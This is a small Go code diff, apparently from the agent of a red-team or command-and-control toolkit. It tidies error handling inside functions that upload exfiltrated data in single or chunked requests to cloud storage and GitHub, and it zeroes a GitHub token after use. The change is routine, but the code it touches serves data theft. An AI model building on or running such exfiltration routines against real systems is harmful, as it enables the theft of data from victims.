@@ -169,7 +169,7 @@ func singleUpload(task structs.Task, client *http.Client, cloud cloudExfilParams
 		return 0, fmt.Errorf("upload failed: %w", err)
 	}
 	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body) // drain body
+	_, _ = io.Copy(io.Discard, resp.Body) // drain body
 
 	if resp.StatusCode >= 400 {
 		return 0, fmt.Errorf("server returned %d %s", resp.StatusCode, resp.Status)
@@ -228,7 +228,7 @@ func chunkedUpload(task structs.Task, client *http.Client, cloud cloudExfilParam
 		if err != nil {
 			return totalUploaded, chunkNum, fmt.Errorf("chunk %d upload failed: %w", chunkNum, err)
 		}
-		io.Copy(io.Discard, resp.Body)
+		_, _ = io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 
 		if resp.StatusCode >= 400 {
@@ -336,7 +336,7 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 			SHA string `json:"sha"`
 		} `json:"content"`
 	}
-	json.Unmarshal(respBody, &ghResp)
+	_ = json.Unmarshal(respBody, &ghResp)
 
 	// Zero the token from memory
 	structs.ZeroString(&gh.Token)
